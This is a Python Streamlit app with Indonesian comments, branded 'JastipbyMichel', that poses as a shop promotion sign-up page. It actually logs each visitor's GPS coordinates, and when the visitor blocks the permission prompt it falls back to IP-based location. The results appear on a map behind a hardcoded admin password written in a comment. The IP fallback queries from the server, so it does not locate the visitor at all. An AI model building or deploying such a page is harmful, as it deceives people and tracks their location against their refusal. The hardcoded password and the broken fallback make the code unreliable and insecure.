import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import pandas as pd
import requests
import os
import datetime

# Mengubah judul tab browser menjadi nama brand Anda
st.set_page_config(page_title="JastipbyMichel - Registrasi Lokasi", layout="centered")

LOCAL_DB = "data_lokasi_jastip.csv"

def muat_data():
    if os.path.exists(LOCAL_DB):
        return pd.read_csv(LOCAL_DB)
    return pd.DataFrame(columns=["waktu", "metode", "latitude", "longitude"])

def simpan_data(metode, lat, lon):
    df = muat_data()
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_baru = pd.DataFrame([[waktu, metode, lat, lon]], columns=["waktu", "metode", "latitude", "longitude"])
    df = pd.concat([df, data_baru], ignore_index=True)
    df.to_csv(LOCAL_DB, index=False)
    return df

def ambil_lokasi_via_ip():
    try:
        response = requests.get("http://ip-api.com", timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return data.get('lat'), data.get('lon')
    except:
        pass
    return None, None

# ================= TAMPILAN HALAMAN UTAMA (JASTIPBYMICHEL) =================
st.title("🛍️ JastipbyMichel - Aktivasi Promosi")
st.write("Selamat datang! Posisi instansi/toko Anda sedang didaftarkan ke dalam database promosi JastipbyMichel.")

# Jalankan sistem deteksi tombol GPS komponen
lokasi_gps = streamlit_geolocation()

if "status_daftar" not in st.session_state:
    st.session_state["status_daftar"] = "Belum Terdaftar"

# KONDISI 1: Pengguna mengizinkan GPS Akurat
if lokasi_gps.get("latitude") and lokasi_gps.get("longitude"):
    if st.session_state["status_daftar"] != "GPS Akurat Terkunci":
        lat = lokasi_gps["latitude"]
        lon = lokasi_gps["longitude"]
        simpan_data("Satelit GPS (Presisi)", lat, lon)
        st.session_state["status_daftar"] = "GPS Akurat Terkunci"
        st.success("🎉 SUKSES! Koordinat lokasi toko Anda berhasil dikunci ke database JastipbyMichel!")
        st.balloons()

# KONDISI 2: Pengguna diam saja atau memblokir pop-up (Otomatis ambil IP)
else:
    if st.session_state["status_daftar"] == "Belum Terdaftar":
        lat_ip, lon_ip = ambil_lokasi_via_ip()
        if lat_ip and lon_ip:
            simpan_data("IP Internet (Kota)", lat_ip, lon_ip)
            st.session_state["status_daftar"] = "Lokasi IP Terkunci"
            st.info("⚡ Sistem Otomatis: Lokasi wilayah Anda berhasil dideteksi oleh sistem JastipbyMichel.")
        else:
            st.warning("Menunggu respons perangkat untuk membaca posisi...")


# ================= DASHBOARD ADMIN (PASSWORD: michel123) =================
st.markdown("<br><br><br><br><br><hr>", unsafe_allow_html=True)
st.write("🔒 *Fitur Khusus Pengembang / Admin JastipbyMichel*")

# Kolom Input Password Rahasia (Sudah diganti agar sesuai dengan nama Anda)
password_input = st.text_input("Masukkan Password Admin untuk melihat peta sebaran:", type="password")

if password_input == "michel123":
    st.success("Akses Diterima! Menampilkan Dashboard Sebaran Toko.")
    st.subheader("📊 Peta Database JastipbyMichel")

    df_tampil = muat_data()

    if not df_tampil.empty:
        st.metric(label="Total Mitra Toko Terlacak", value=len(df_tampil))
        
        st.write("### Peta Sebaran Lokasi")
        st.map(df_tampil)
        
        st.write("### Log Rincian Data")
        st.dataframe(df_tampil, use_container_width=True)
    else:
        st.info("Belum ada lokasi toko yang masuk.")
elif password_input != "":
    st.error("Password Salah! Akses ditolak.")
